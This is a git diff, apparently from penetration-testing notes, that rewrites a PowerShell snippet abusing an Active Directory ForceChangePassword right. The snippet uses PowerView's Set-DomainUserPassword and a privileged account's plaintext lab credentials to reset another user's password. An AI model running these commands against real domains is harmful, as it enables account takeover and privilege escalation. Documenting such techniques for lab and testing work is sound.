@@ -43,25 +43,17 @@ Add-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -
 Windows
 
 ```powershell
-$NewPass = 'NewPass@Pentest@'
-$TargedUser = 'INLANEFREIGHT.LOCAL\ssmalls'
+# Target to reset password
+$TargedUser = 'ssmalls'
+$TargetNewPass = 'NewPass@Pentest@'
+# Privileged user that can ForceChangePassword
 $PrivUser = 'INLANEFREIGHT.LOCAL\hporter'
 $PrivPassword = 'Gr8hambino!'
-$SecPassword = ConvertTo-SecureString '' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential($TargedUser, $NewPass)
-$SecPassword = ConvertTo-SecureString 'Gr8hambino!' -AsPlainText -Force 
+
+$SecPassword = ConvertTo-SecureString $PrivPassword -AsPlainText -Force 
 $Cred = New-Object System.Management.Automation.PSCredential($PrivUser, $SecPassword)
-$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-
-Set-DomainUserPassword -Identity ssmalls -AccountPassword $UserPassword -Credential $Cred
-
-# Utilisation de credentials alternatifs
-$PrivilegedUserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$PrivilegedCreds = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $PrivilegedUserPassword)
-# Nouveau mot de passe a appliquer
-$newPassword = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
-# Modification du mot de passe
-Set-DomainUserPassword -Identity Target_AD_User -Password $newPassword -Credential $PrivilegedCreds
+$NewSecPassword = ConvertTo-SecureString $TargetNewPass -AsPlainText -Force
+Set-DomainUserPassword -Identity $TargedUser -AccountPassword $NewSecPassword -Credential $Cred
 ```
 
 Linux
